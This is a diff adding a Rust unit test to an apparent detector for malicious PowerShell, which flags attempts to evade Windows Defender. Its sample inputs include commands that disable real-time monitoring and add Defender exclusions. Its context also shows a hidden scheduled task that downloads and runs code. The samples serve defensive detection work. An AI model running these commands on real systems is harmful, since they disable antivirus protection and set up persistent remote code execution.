@@ -3301,6 +3301,29 @@ schtasks /create /tn "Updater" /tr "powershell -w hidden \"IEX(New-Object Net.We
     }
 
     #[test]
+    fn mppreference_ambiguous_exclusion_prefix_does_not_emit_multiple_traits() {
+        let script = br#"powershell -Command "Add-MpPreference -Ex C:\Users\Public""#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        let exclusion_count = report
+            .traits
+            .iter()
+            .filter(|t| {
+                matches!(
+                    t,
+                    Trait::DefenderEvasion { action, .. }
+                        if action.starts_with("exclusion-")
+                )
+            })
+            .count();
+        assert_eq!(
+            exclusion_count, 0,
+            "ambiguous MpPreference -Ex prefix should not emit exclusion traits: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn set_mppreference_disable_named_argument_forms_emit_defender_evasion_traits() {
         let script = br#"powershell -Command "Set-MpPreference -DisableRealtimeMonitoring:$true -SubmitSamplesConsent=2"
 "#;
